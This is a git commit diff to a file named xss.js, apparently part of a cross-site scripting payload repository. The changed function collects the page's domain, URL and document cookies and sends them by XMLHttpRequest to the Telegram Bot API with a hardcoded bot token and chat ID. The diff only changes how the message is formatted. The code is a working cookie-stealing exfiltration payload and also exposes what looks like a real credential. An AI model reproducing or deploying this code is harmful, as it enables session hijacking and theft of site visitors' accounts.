475574394ae1d81373c0c38fa74c18be69f5fda0
Syukirman Amir <128995740+syukirman-amir@users.noreply.github.com>
2024-04-27 13:22:34 +0900

    Update xss.js

--- xss.js
+++ xss.js
@@ -2,7 +2,7 @@ var tokenBot = '6299530694:AAGQ4i4FThkwbr51cZZnL-Pt69uYa8EiW98'; // Your "tokenB
 var chatId = '480631913'; // Your "chatId" Here
 
 function telegramSend(tokenBot, chatId) {
-	var textData = '**XSS+Alert+in+**' + document['domain']+'%0d%0a------------------------------------------------%0d%0a%0d%0a**-+URL+Target+-**%0d%0a**' + document['location']['hostname'] + document['location']['pathname'] + '**%0d%0a%0d%0a**-+Document+Cookie+-</b>%0d%0a**' + document['cookie'] + '**';
+	var textData = 'XSS+Alert+in+' + document['domain']+'%0d%0a------------------------------------------------%0d%0a%0d%0a-+URL+Target+-%0d%0a' + document['location']['hostname'] + document['location']['pathname'] + '%0d%0a%0d%0a-+Document+Cookie+-%0d%0a' + document['cookie'] + '+';
     var xhr = new XMLHttpRequest();
     xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=markdown', true);
     xhr.send();
